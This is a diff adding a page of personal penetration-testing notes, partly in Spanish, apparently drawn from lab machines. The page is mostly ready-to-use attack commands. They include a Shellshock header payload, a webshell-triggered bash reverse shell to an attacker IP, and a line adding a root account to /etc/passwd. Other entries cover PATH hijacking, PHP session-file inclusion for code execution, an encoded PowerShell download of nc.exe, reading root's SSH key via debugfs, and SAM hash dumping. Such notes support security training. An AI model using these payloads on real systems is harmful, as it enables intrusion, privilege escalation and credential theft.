@@ -1,0 +1,141 @@
+<h1 id="stderr-y-stdout">stderr y stdout</h1>
+<p>a veces los comandos por ejemplo en shellshock salen por stderr asi que tenemos que redireccionar stdout a stderr ex:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; nc  -h 2&gt;&amp;1; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi -s \
+</code></pre></div></div>
+
+<h1 id="unzip-with-python">unzip with python</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">zipfile</span> <span class="kn">import</span> <span class="n">PyZipFile</span>
+<span class="k">for</span> <span class="n">zip_file</span> <span class="ow">in</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
+    <span class="n">pzf</span> <span class="o">=</span> <span class="n">PyZipFile</span><span class="p">(</span><span class="n">zip_file</span><span class="p">)</span>
+    <span class="n">pzf</span><span class="p">.</span><span class="n">extractall</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h1 id="urlencode-webshell-request-with-curl">urlencode webshell request with curl</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X POST http://10.10.10.143/pwned.php --data-urlencode ​ 'exec=bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.4/1234 0&gt;&amp;1"'
+</code></pre></div></div>
+
+<h1 id="run-bash-commands-from-powershell-wut">run bash commands from powershell (wut)</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\windows&gt; bash -c "command"
+</code></pre></div></div>
+
+<h1 id="ftp">FTP</h1>
+<p>bajar archivos con tipo binario porque los rompe sino</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; type binary
+ftp&gt; get backup.mdb
+</code></pre></div></div>
+
+<h1 id="powershell-hidden-files">powershell hidden files</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir -Force
+</code></pre></div></div>
+<h1 id="data-stream">data stream</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /R
+hm.txt:root.txt:$DATA
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>​powershell Get-Content -Path "hm.txt" -Stream "root.txt"
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>more &lt; hm.txt:root.txt
+</code></pre></div></div>
+
+<h1 id="rdp">rdp</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop -g 85% -r disk:share=/var/www -r clipboard:CLIPBOARD -u username -p password 10.10.10.10
+</code></pre></div></div>
+
+<h1 id="if-can-run-as-sudo-but-dont-have-shell">if can run as sudo but dont have shell</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'toor:aaKNIEDOaueR6:0:0:toor:/root:/bin/bash' &gt;&gt; /etc/passwd
+</code></pre></div></div>
+<p>It will create a new root user with the password “foo”. The encrypted password was generated with: perl -le ‘print crypt(“foo”, “aa”)’. You can then easily elevate to a root shell with su toor.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>localgroup Administrators offsec /add
+</code></pre></div></div>
+<p>this only work for old windows in modern execute a reverse shell might be the best idea</p>
+
+<h1 id="clean-carriage-return-from-scripts">clean carriage return from scripts</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sed -i -e ‘s/\r$//’ &lt;script name&gt;
+</code></pre></div></div>
+
+<h1 id="steghide-steganofrafia">steghide steganofrafia</h1>
+<p>usalo para sacar por ejemplo ssh que esten en una imagen</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steghide extract -sf archivo.png
+</code></pre></div></div>
+
+<h1 id="pading-oracle-attack">pading oracle attack</h1>
+
+<h1 id="suid">suid</h1>
+<p>si no tiene full path en sudo -l podemos hijackearlo cambiando el path</p>
+
+<p>Because a full path to the cat binary is not specified, this specific command is vulnerable to
+hijacking by modifying the ​ PATH​ system variable. This can be achieved by setting the working
+directory as the first option in PATH, with the command ​ export PATH=.:$PATH
+After this, creating a file named ​ cat​ in the working directory will cause the file to be executed by
+the root user. In this case, a bash script will do the trick. Note, do not use the ​ cat​ command in the
+script as this will cause the script to loop endlessly. Don’t forget to ​ chmod +x ./cat​ before running
+the backup binary. The script below creates a copy of the root flag in the home directory.</p>
+
+<h1 id="ipv6-">IPV6 ?</h1>
+
+<h1 id="unix-wildcards">unix wildcards</h1>
+<p>https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</p>
+
+<h1 id="windows-php-cookies">windows php cookies</h1>
+<p>PHP stores the session files in C:\Windows\TEMP in the format sess_<cookie> . In order to read
+our session file we will use the session ID we acquired. In this case the session file would be
+sess_923nktm0vmmi12qrptls332t5o . Let's see if we can read it
+Replace everything after sess_ with your own cookie value.</cookie></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X GET http://10.10.10.151/blog/?
+lang=/windows/temp/sess_923nktm0vmmi12qrptls332t5o
+</code></pre></div></div>
+<p>f we can create a username containing PHP code, we could potentially gain RCE. Consider the
+following as a username.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?=</span><span class="sb">`powershell whoami`</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h2 id="bypass-blacklisting-chars">bypass blacklisting chars</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "wget http://10.10.14.23/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t
+UTF-16LE | base64
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?=</span><span class="sb">`powershell /enc
+dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAzAC8AbgBjAC4AZQB4AGUA
+IAAtAG8AIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABFAE0AUABcAG4AYwAuAGUAeABlAAoA`</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h1 id="procdump">procdump</h1>
+
+<h1 id="express-using-jwt-token">express using jwt token</h1>
+<ul>
+  <li>get the token
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s -X POST  http://10.10.10.137:3000/login -d "username=admin&amp;password=pas111223" | jq
+</code></pre></div>    </div>
+  </li>
+  <li>use the token
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s http://10.10.10.137:3000/ -H ​ 'Authorization: Bearer
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNT
+U4ODU1NTYzLCJleHAiOjE1NTg5NDE5NjN9.s7ZbrqwW--H6Ae-UWs3VeO21U2XRwfNEDeL0gAYI
+pX0'​ | jq
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="inodes">INODES</h1>
+<p>if you own the directory but not the file, you can move it and create another one with the same name</p>
+
+<h1 id="disk-permision">disk permision</h1>
+<p>if you have disk permission you can use</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debugfs /dev/sda1
+debugfs: cat /root/.ssh/id_rsa
+</code></pre></div></div>
+<h1 id="powershell-thruogh-ftp-when-restricted">powershell thruogh ftp when restricted</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> echo !powershell.exe &gt; ftpcommands.txt &amp;&amp; ftp -s:ftpcommands.txt
+</code></pre></div></div>
+<h1 id="weird-dependencies-location">weird dependencies location</h1>
+<p>for example :
+As gcc is not available on the target machine, the exploit must be compiled locally. LinEnum
+previously identified ​ /home/decoder/test​ as world-writable and can be used to drop the binary.
+Attempting to run the exploit without modification will fail as the target is missing ​ /etc/lsb-release​ .
+Simply changing references of ​ /etc/lsb-release​ to ​ /home/decoder/test/lsb-release​ is sufficient.</p>
+
+<h1 id="dump-hashes">DUMP HASHES</h1>
+<p>reg save hklm\sam c:\sam
+reg save hklm\system c:\system
+python /usr/share/doc/python-impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL</p>
